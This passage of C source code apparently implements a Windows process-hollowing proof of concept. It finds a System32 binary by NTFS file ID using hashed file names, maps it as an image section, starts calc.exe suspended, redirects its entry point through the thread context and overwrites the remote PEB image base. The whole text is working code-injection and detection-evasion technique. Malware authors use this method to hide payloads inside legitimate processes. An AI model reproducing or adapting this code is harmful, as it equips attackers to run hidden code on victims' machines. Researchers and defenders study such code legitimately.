		if (DirectoryInformation->NextEntryOffset != 0)
		{
			PBYTE pByte = (PBYTE)DirectoryInformation;
			for (PFILE_ID_BOTH_DIR_INFORMATION Next = (PFILE_ID_BOTH_DIR_INFORMATION)pByte; Next->NextEntryOffset != 0; pByte += Next->NextEntryOffset)
			{
				Next = (PFILE_ID_BOTH_DIR_INFORMATION)pByte;
				if (HashStringFowlerNollVoVariant1aW(Next->FileName) == Hash) //L"cmd.exe"
				{
					RtlCopyMemory(uId, &Next->FileId, sizeof(Next->FileId));
					FileId = Next->FileId.QuadPart;
					goto EXIT_ROUTINE;
				}
			}
		}
	}

EXIT_ROUTINE:

	if (DirectoryInformation)
		RtlFreeHeap(GlobalProcessHeap, HEAP_ZERO_MEMORY, DirectoryInformation);

	if (FileId == ERROR_FAILURE_NULL_BUFFER)
	{
		if (!NT_SUCCESS(Status))
			InternalSetLastError(RtlNtStatusToDosError(Status));
	}

	return FileId;
}

HANDLE RtlGetVolumeRelativeHandle(VOID)
{
	HANDLE RootHandle = NULL;
	NTSTATUS Status = STATUS_SUCCESS;
	UNICODE_STRING RootDirectory = { 0 };
	OBJECT_ATTRIBUTES Attributes = { 0 };
	IO_STATUS_BLOCK Io = { 0 };

	RtlInitUnicodeString(&RootDirectory, L"\\??\\C:\\");
	InitializeObjectAttributes(&Attributes, &RootDirectory, OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = NtOpenFile(&RootHandle, FILE_READ_DATA, &Attributes, &Io, FILE_SHARE_READ, FILE_OPEN);
	if (!NT_SUCCESS(Status))
		InternalSetLastError(RtlNtStatusToDosError(Status));

	return RootHandle;
}

HANDLE YarhLoader(ULONG Hash, PWCHAR TargetDirectory)
{
	HANDLE TargetDirectoryHandle = INVALID_HANDLE_VALUE;
	LARGE_INTEGER uId = { 0 };
	FILE_ID_DESCRIPTOR FileId = { 0 };
	HANDLE RelativeVolumeHandle = NULL;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	TargetDirectoryHandle = SubroutineNtCreateFile(TargetDirectory);
	if (TargetDirectoryHandle == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	if(SubroutineGetNtfsFileId(TargetDirectoryHandle, &uId, Hash) == 0)
		goto EXIT_ROUTINE;

	RelativeVolumeHandle = RtlGetVolumeRelativeHandle();
	if (RelativeVolumeHandle == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	FileId.dwSize = sizeof(FILE_ID_DESCRIPTOR);
	FileId.Type = FileIdType;
	FileId.FileId.QuadPart = uId.QuadPart;

	hFile = OpenFileById(RelativeVolumeHandle, &FileId, FILE_GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, 0);

EXIT_ROUTINE:

	if (RelativeVolumeHandle)
		NtClose(RelativeVolumeHandle);

	if(TargetDirectoryHandle)
		NtClose(TargetDirectoryHandle);

	return hFile;
}

HANDLE SubroutineNtCreateSection(PHANDLE hFile)
{
	NTSTATUS Status = STATUS_SUCCESS;
	HANDLE hSection = INVALID_HANDLE_VALUE;

	Status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NT_SUCCESS(Status))
		InternalSetLastError(RtlNtStatusToDosError(Status));

	return hSection;
}

PVOID SubroutineNtMapViewOfSection(HANDLE Process, HANDLE hSection)
{
	NTSTATUS Status = STATUS_SUCCESS;
	SIZE_T View = 0;
	PVOID BaseAddress = NULL;

	Status = NtMapViewOfSection(hSection, Process, &BaseAddress, 0, 0, 0, &View, ViewShare, 0, PAGE_READONLY);
	if (!NT_SUCCESS(Status))
		InternalSetLastError(RtlNtStatusToDosError(Status));

	return BaseAddress;
}

PBYTE GetNtHeaders(PBYTE Buffer)
{
	PIMAGE_DOS_HEADER Dos;
	PIMAGE_NT_HEADERS32 Nt32;
	ULONG MaxOffset = 1024;

	Dos = (PIMAGE_DOS_HEADER)Buffer;
	if (Dos->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	if ((ULONG)Dos->e_lfanew > MaxOffset)
		return NULL;

	Nt32 = (PIMAGE_NT_HEADERS32)(Buffer + Dos->e_lfanew);
	if (Nt32->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return (PBYTE)Nt32;
}

WORD GetNtHeaderArchitecture(PBYTE Buffer)
{
	PIMAGE_NT_HEADERS32 Nt32 = (PIMAGE_NT_HEADERS32)GetNtHeaders(Buffer);
	if (Nt32 == NULL)
		return ERROR_FAILURE_NULL_BUFFER;

	return Nt32->OptionalHeader.Magic;
}

BOOL IsImage64Bit(PBYTE Buffer)
{
	if (GetNtHeaderArchitecture(Buffer) == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		return TRUE;
	else
		return FALSE;
}

BOOL RtlInitSystem32File(PWCHAR Buffer, LPCWSTR File, BOOL DosPath)
{
	WCHAR WindowsDirectory[WMAX_PATH] = { 0 };
	WCHAR NtObjectSystem32Directory[WMAX_PATH] = { 0 };

	if (!RtlGetEnvironmentVariableAltW(L"WINDIR", WindowsDirectory, WMAX_PATH))
		return FALSE;

	StringConcatW(WindowsDirectory, (PWCHAR)L"\\System32\\");

	if(!DosPath)
		if (StringCopyW(Buffer, (PWCHAR)L"\\??\\") == NULL) return FALSE;

	if (StringConcatW(Buffer, WindowsDirectory) == NULL) return FALSE;

	if (File == NULL)
		return TRUE;

	if (StringConcatW(Buffer, (PWCHAR)File) == NULL) return FALSE;

	return TRUE;	
}

DWORD RtlGetEntryPointRelativeAddress(PBYTE Buffer)
{
	PIMAGE_NT_HEADERS64 Nt64 = NULL;
	PIMAGE_NT_HEADERS32 Nt32 = NULL;
	PBYTE AmbiguousNt = GetNtHeaders(Buffer);
	if (AmbiguousNt == NULL)
		return ERROR_FAILURE_NULL_BUFFER;

	if (GetNtHeaderArchitecture(Buffer) == IMAGE_FILE_MACHINE_AMD64)
	{
		Nt64 = (PIMAGE_NT_HEADERS64)AmbiguousNt;
		return Nt64->OptionalHeader.AddressOfEntryPoint;
	}
	else
	{
		Nt32 = (PIMAGE_NT_HEADERS32)AmbiguousNt;
		return (ULONGLONG)Nt32->OptionalHeader.AddressOfEntryPoint;
	}
}

BOOL ModifyRemoteEntryPoint64(PPROCESS_INFORMATION Pi, ULONGLONG EntryPointVirtualAddress)
{
	NTSTATUS Status = STATUS_SUCCESS;
	CONTEXT Context = { 0 };
	RtlSecureZeroMemory(&Context, sizeof(CONTEXT));
	Context.ContextFlags = CONTEXT_INTEGER;

	Status = NtGetContextThread(Pi->hThread, &Context);
	if(!NT_SUCCESS(Status))
		return FALSE;

	Context.Rcx = EntryPointVirtualAddress;

	Status = NtSetContextThread(Pi->hThread, &Context);
	if (!NT_SUCCESS(Status))
		return FALSE;
	else
		return TRUE;
}

BOOL ModifyRemoteEntryPoint32(PPROCESS_INFORMATION Pi, ULONGLONG EntryPointVirtualAddress)
{
	NTSTATUS Status = STATUS_SUCCESS;
	ULONG uReturn = 0;
	WOW64_CONTEXT Context = { 0 };
	RtlSecureZeroMemory(&Context, sizeof(WOW64_CONTEXT));
	Context.ContextFlags = CONTEXT_INTEGER;
	BOOL bFlag = FALSE;

	Status = NtQueryInformationThread(Pi->hThread, ThreadWow64Context, &Context, sizeof(WOW64_CONTEXT), &uReturn);
	if (!NT_SUCCESS(Status))
		goto EXIT_ROUTINE;
		
	Context.Eax = (DWORD)EntryPointVirtualAddress;

	Status = NtSetInformationThread(Pi->hThread, ThreadWow64Context, &Context, sizeof(WOW64_CONTEXT));
	if (!NT_SUCCESS(Status))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if(!bFlag)
		InternalSetLastError(RtlNtStatusToDosError(Status));

	return bFlag;
}

ULONGLONG RtlGetRemotePeb64(PPROCESS_INFORMATION Pi)
{
	NTSTATUS Status = STATUS_SUCCESS;
	CONTEXT Context = { 0 };
	RtlSecureZeroMemory(&Context, sizeof(CONTEXT));
	Context.ContextFlags = CONTEXT_INTEGER;

	Status = NtGetContextThread(Pi->hThread, &Context);
	if(!NT_SUCCESS(Status))
		return ERROR_FAILURE_NULL_BUFFER;

	return Context.Rdx;
}

ULONGLONG RtlGetRemotePeb32(PPROCESS_INFORMATION Pi)
{
	NTSTATUS Status = STATUS_SUCCESS;
	ULONG uReturn = 0;
	WOW64_CONTEXT Context = { 0 };
	RtlSecureZeroMemory(&Context, sizeof(WOW64_CONTEXT));
	Context.ContextFlags = CONTEXT_INTEGER;

	Status = NtQueryInformationThread(Pi->hThread, ThreadWow64Context, &Context, sizeof(WOW64_CONTEXT), &uReturn);
	if (!NT_SUCCESS(Status))
		return ERROR_FAILURE_NULL_BUFFER;
	else
		return (ULONGLONG)Context.Ebx;
}

ULONGLONG SubroutineGetImagePebOffset(BOOL Is32bit)
{
	if (Is32bit)
		return sizeof(DWORD) * 2;
		
	return sizeof(ULONGLONG) * 2;
}

BOOL HollowProcessInternal(PBYTE Image, PVOID Base, PPROCESS_INFORMATION Pi, BOOL Is32Bit)
{
	DWORD EntryPoint = 0;
	ULONGLONG EntryPointVirtualAddress = 0;
	ULONGLONG RemotePeb = 0;
	LPVOID RemoteImageBase = NULL;
	SIZE_T ImageSize = 0;
	NTSTATUS Status = STATUS_SUCCESS;

	EntryPoint = RtlGetEntryPointRelativeAddress(Image);
	EntryPointVirtualAddress = (ULONGLONG)(Image + EntryPoint);

	if (Is32Bit){ 
		if (!ModifyRemoteEntryPoint32(Pi, EntryPointVirtualAddress)) 
			return FALSE; 

		RemotePeb = RtlGetRemotePeb32(Pi);
		if (RemotePeb == 0)
			return FALSE;
	}
	else{
		if (!ModifyRemoteEntryPoint64(Pi, EntryPointVirtualAddress))
			return FALSE;

		RemotePeb = RtlGetRemotePeb64(Pi);
		if (RemotePeb == 0)
			return FALSE;
	}

	RemoteImageBase = (LPVOID)(RemotePeb + SubroutineGetImagePebOffset(Is32Bit));

	if (Is32Bit)
		ImageSize = sizeof(DWORD);
	else
		ImageSize = sizeof(ULONGLONG);

	Status = NtWriteVirtualMemory(Pi->hProcess, RemoteImageBase, &Base, ImageSize, NULL);
	if (!NT_SUCCESS(Status))
	{
		InternalSetLastError(RtlNtStatusToDosError(Status));
		return FALSE;
	}

	return TRUE;
}

BOOL RtlHollowProcess64(HANDLE hSection, PBYTE Mapped, PWCHAR Target)
{
	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { 0 };
	HANDLE Process = INVALID_HANDLE_VALUE;
	PVOID RemoteBaseAddress = NULL;
	BOOL bFlag = TRUE;

	Si.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(Target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &Si, &Pi))
		return FALSE;

	Process = Pi.hProcess;
	RemoteBaseAddress = SubroutineNtMapViewOfSection(Process, hSection);
	if (RemoteBaseAddress == NULL)
		return FALSE;

	if (IsImage64Bit(Mapped))
		bFlag = FALSE;

	if(!HollowProcessInternal(Mapped, RemoteBaseAddress, &Pi, bFlag))
		return FALSE;

	NtResumeThread(Pi.hThread, NULL);

	return TRUE;
}

INT wmain(VOID)
{
	WCHAR NtObjectSystem32Directory[WMAX_PATH] = { 0 };
	WCHAR NtCalcPath[WMAX_PATH] = { 0 };
	DWORD dwError = ERROR_SUCCESS;
	BOOL bFlag = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hSection = INVALID_HANDLE_VALUE;
	PVOID MappedBinary = NULL;

	if (!RtlInitGlobalApplicationData())
		goto EXIT_ROUTINE;

	if (!RtlInitSystem32File(NtObjectSystem32Directory, NULL, FALSE))
		goto EXIT_ROUTINE;

	//0x6257d638 Dispose.exe
	//0xbb309ae5 cmd.exe
	hFile = YarhLoader(0x6257d638, NtObjectSystem32Directory);
	if (hFile == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	hSection = SubroutineNtCreateSection(hFile);
	if (hSection == NULL)
		goto EXIT_ROUTINE;

	MappedBinary = SubroutineNtMapViewOfSection(GetCurrentProcess(), hSection);
	if (MappedBinary == NULL)
		goto EXIT_ROUTINE;

	if (!IsImage64Bit(MappedBinary))
		goto EXIT_ROUTINE;

	if (!RtlInitSystem32File(NtCalcPath, L"calc.exe", TRUE))
		goto EXIT_ROUTINE;

	if (!RtlHollowProcess64(hSection, (PBYTE)MappedBinary, NtCalcPath))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

	system("PAUSE");
	
EXIT_ROUTINE:

	if (!bFlag)
		dwError = InternalGetLastError();

	if (MappedBinary)
		NtUnmapViewOfSection(hSection, MappedBinary);

	if (hSection)
		NtClose(hSection);

	if (hFile)
		NtClose(hFile);

	return dwError;
}